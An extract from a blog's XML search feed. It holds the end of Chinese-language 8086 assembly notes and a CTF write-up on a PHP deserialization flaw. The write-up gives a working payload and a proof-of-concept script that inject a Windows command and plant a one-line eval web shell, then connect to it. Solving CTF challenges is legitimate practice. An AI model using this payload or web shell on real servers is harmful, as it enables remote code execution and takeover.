</ul>
<p>高位字节存放在高位内存</p>
<p>低位字节存在低位内存</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>由高地址向低地址增长</p>
<blockquote>
<p>CS:IP指向指令</p>
<p>DS:IP指向数据</p>
<p>SS栈段寄存器(Stack segment) - 存放栈顶的段地址</p>
<p>SP寄存器(Stack pointer) - 存放栈顶的偏移地址</p>
<p>SS:SP指向栈顶元素，但如果stack为空的时候，会指向最高地址单元的下一个单元，比如栈空间是10000H~1000FH，如果stack为空，会指向1000:10（所以不存在栈顶元素）</p>
<ul>
<li>也可以说是最后一个元素被pop, SP=E(最后一个元素所在栈地址)+2=10</li>
</ul>
</blockquote>
<p>push ax</p>
<ul>
<li><p>先SP = SP-2(因为ax是2个bytes = word，所以是<strong>2</strong>个内存空间)</p>
</li>
<li><p>把ax放进SS:SP指向的位置</p>
</li>
</ul>
<p>pop ax</p>
<ul>
<li><p>先把SS:SP指向位置的内容pop并赋值给ax</p>
</li>
<li><p>SP = SP+2</p>
</li>
</ul>
<p>pop的时候其实没有删除数据，只是指针改变了（所以被pop的数据就不在栈里了，因为它的地址不在栈顶），下次push的时候原本的东西就被覆盖了。</p>
<p>C语言里面的函数其实就是用到了栈，函数会把局部变量什么的都放在stack里，当函数返回后，stack就没有了。</p>
<h2 id="栈顶越界的问题"><a href="#栈顶越界的问题" class="headerlink" title="栈顶越界的问题"></a>栈顶越界的问题</h2><p>8086CPU只知道：</p>
<ul>
<li>当前栈顶在何处</li>
<li>当前要执行的指令是哪一条</li>
</ul>
<p>要防止push和pop导致栈顶超界，根据可能用到的最大栈空间，来安排栈的大小 - 防止push的数据太多而导致超界、栈空的时候继续pop导致超界。</p>
<h2 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 寄存器</span><br><span class="line">push 段寄存器</span><br><span class="line">push 内存单元#push [0] -&gt; ds:ip</span><br><span class="line">pop 寄存器</span><br><span class="line">pop 段寄存器</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211202103533130.png" alt="image-20211202103533130"></p>
<p>上图演示了将2266H放入10000H的位置。因为push会先减去sp，所以我们要先把sp+2</p>
<h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><p><strong>再次强调：</strong></p>
<p>SS:SP指向栈顶元素，但如果stack为空的时候，会指向最高地址单元的下一个单元，比如栈空间是10000H~1000FH，如果stack为空，会指向1000:10（所以不存在栈顶元素）</p>
<ul>
<li>也可以说是最后一个元素被pop, SP=E(最后一个元素所在栈地址)+2=10</li>
</ul>
<h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><p>伪指令是让编译器去处理</p>
<p>汇编指令是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg #假设代码代码段叫做codesg</span><br><span class="line"></span><br><span class="line">codesg segement</span><br><span class="line"></span><br><span class="line">start:	mov ax,0123H</span><br><span class="line">		mov bx,056H</span><br><span class="line">		add ax,bx</span><br><span class="line">		add ax,ax</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00H</span><br><span class="line">	int 21H</span><br><span class="line">codesg ends #段的结束</span><br><span class="line"></span><br><span class="line">end start#结束 这里的start可以随便什么名字，程序只会查找end后面的东西</span><br></pre></td></tr></table></figure>

<p><strong>程序返回：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure>

<p>CMD将程序载入内存，将CPU的CS:IP指向程序，程序运行结束后回到command，CPU继续运行command</p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Reverse Engineering</tag>
        <tag>Assembly Fundamentals</tag>
      </tags>
  </entry>
  <entry>
    <title>记某CTF赛题PHP反序列化漏洞解题过程</title>
    <url>/2021/07/23/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在群里看见有人发了一个CTF赛题，看了下是PHP反序列化类型的，出于好奇便做了一下，途中遇到一些坑，最后终于解决了，同时我也收获了一些自己平时没有注意过、了解掌握过的知识，因此将这个解题思路和过程记录下来，方便以后复习。</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="确定漏洞类型"><a href="#确定漏洞类型" class="headerlink" title="确定漏洞类型"></a>确定漏洞类型</h2><p>因为代码是直接发在群里的，我把它手动复制粘贴到了PHP文件里，方便操作。</p>
<span id="more"></span>

<p>首先看下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span> = <span class="string">&quot;hello ctfer&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">decode_data</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析代码可知，第28号处有<code>unserialize()</code>，这意味着这道题是PHP反序列化漏洞的题且我们需要传入一个携带<code>data</code>参数的GET请求。</p>
<h2 id="确定利用的Class"><a href="#确定利用的Class" class="headerlink" title="确定利用的Class"></a>确定利用的Class</h2><p>那么这里有什么可以被我们用来利用的类吗？这时我看到了<code>class A</code>，发现如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);<span class="comment">//此处高亮！！发现了命令执行代码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>Class A</code>中，有一个<code>toString()</code>的方法，方法内部有我们想要的命令执行代码。</p>
<p>我们知道当Object与字符串比较或被执行与字符串相关操作的时候，<code>__toString()</code>会被call。继续看，<code>$data</code>会被执行<code>decode_data($data)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//此处data被取了strlen,所以to_String()是会被call的</span></span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点来了，<code>strlen($data)</code>代表着<code>$data</code>最终是会被执行<code>__toString()</code>的，那么我们更加确信，<code>Class A</code> <strong>可以被我们利用实现反序列化</strong>。</p>
<h2 id="构造利用Class"><a href="#构造利用Class" class="headerlink" title="构造利用Class"></a>构造利用Class</h2><p>在<code>__toString()</code>方法中，我们必须满足 <code>if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents)))</code>，才能执行<code>system()</code>命令。</p>
<p>来看下<code>preg_match()</code>解释</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723150712496.png" alt="image-20210723150712496"></p>
<p>由此可知，<code>preg_match()</code>在第一次匹配到结果后，就结束匹配了。那么我们可以把代码理解为如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//从变量contents的开头第一个字符开始，到最后一个字符，匹配是否为a-z的字母，如果结果为真，进入下面的代码，否则进入else&#123;&#125;</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]/i&#x27;</span>,<span class="variable">$this</span>-&gt;contents))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$this</span>-&gt;contents&quot;</span>);<span class="comment">//命令执行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;...&quot;</span>;<span class="comment">//未匹配到</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>举个例子，如果我们<code>$contents=&quot;&lt;?php phpinfo() ?&gt;&quot;</code>,<code>preg_match()</code>就会匹配失败，因为我们第一个字符不是字母<code>a-z</code>。但如果我们的<code>contents=&quot;a&lt;?php phpinfo() ?&gt;&quot;</code>，这时候<code>preg_match()</code>匹配到第一个字符为a，符合条件，于是不再继续检测，返回<code>true</code>。</p>
<p>观察 <code>system(&quot;echo $this-&gt;contents&quot;);</code>中有一个<code>echo</code>，是输出的意思。因为我是在<code>windows</code>的环境上搭建的，所以我们需要用<code>windows</code>的<code>DOS</code>命令。这时我想到了使用<code>&amp;</code>来执行多条命令，所以</p>
<p>因此我们可以构造<code>$contents=&#39;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#39;</code>将一句话木马写入<code>leihehe.php</code>文件中</p>
<p>注意在符号前要加上转义符<code>^</code>，否则无法输出：</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723152016246.png" alt="image-20210723152016246"></p>
<p>还有要注意单引号和双引号的问题，PHP中给变量赋值的时候，用双引号会把一些符号给翻译成PHP语言，所以我们这种符号比较多的情况，要用单引号，<code>$_POST[&quot;leihehe&quot;]</code>里面的内容用双引号。</p>
<p>这样我们的<code>Class A</code>就构造好了。</p>
<h2 id="序列化及加密（逆向思维）"><a href="#序列化及加密（逆向思维）" class="headerlink" title="序列化及加密（逆向思维）"></a>序列化及加密（逆向思维）</h2><p>那么我们应该怎么把他序列化呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">decode_data</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过观察，data被传入后会进行自定义的解码，最后再被反序列化。反过来，我们需要先序列化后，再按照它自定义的方式编码。</p>
<p>来看看他是如何解码的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_data</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);<span class="comment">//base64解码</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//将base64解码后的每一个字符都用ord转换成ASCII后，加上它所在的index，再用chr()转换回字符。</span></span><br><span class="line">        <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么他的处理过程是：</p>
<p>data-&gt;base64解码-&gt;chr(ord($data)+$i)-&gt;反序列化</p>
<p>反过来，我们构造的过程可以是：</p>
<p>序列化-&gt;<code>chr(ord($data)-$i)</code>-&gt;base64加密-&gt;data</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span> = <span class="string">&#x27;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$af</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$res</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$af</span>); <span class="variable">$i</span>++)&#123;<span class="comment">//自定义编码过程</span></span><br><span class="line">    <span class="variable">$res</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$af</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$res</span>);<span class="comment">//base64编码后输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163609369.png" alt="image-20210723163609369"></p>
<p>赋值给$data：</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163906677.png" alt="image-20210723163906677"></p>
<p>可见输出了<code>111</code>,这时候我们可以看到目录下已经生成了<code>php</code>文件</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723164057370.png" alt="image-20210723164057370"></p>
<p>连接菜刀即可 - 不知道为什么我的菜刀连接不上，所以直接用浏览器演示好了</p>
<p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723164934353.png" alt="image-20210723164934353"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题我花了很长时间，主要是在以下坑点一直stuck:</p>
<ul>
<li>没有弄清楚题目中自定义解码的过程，导致写不出来逆向的加密过程。<code>ord()</code>和<code>chr()</code>不明白什么意思。<code>ord()</code>是返回字符串第一个字符的<code>ASCII</code>值，<code>chr()</code>是把<strong>ASCII值转换为字符</strong>。</li>
<li>因为不了解<code>preg_match()</code>函数，误认为是检测所有字符，导致在这里卡了很久（自己还不知道去查一下资料..）。<code>preg_match()</code>函数在<strong>匹配到第一个符合的字节后就会停止匹配</strong>。</li>
<li>对<code>Windows</code>下命令行的操作命令不熟悉，又加上不清楚<code>preg_match()</code>方法，导致我以为整个<code>variable</code>完全不能含有特殊符号，一直在想怎么绕过。<strong>Windows下，特殊符号前面需要加转义符^</strong>。</li>
<li>不知道有<code>echo 111 &gt;&gt;1.php</code>这种输出文件的写法。</li>
</ul>
<p>总之这次收获很多，果然是要多做练习才能增加实力。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/4088836/php-preg-match-and-preg-match-all-functions">PHP preg_match and preg_match_all functions</a></p>
<p><a href="https://zhidao.baidu.com/question/684831621725683492.html">关于批处理转义特殊字符</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
</search>
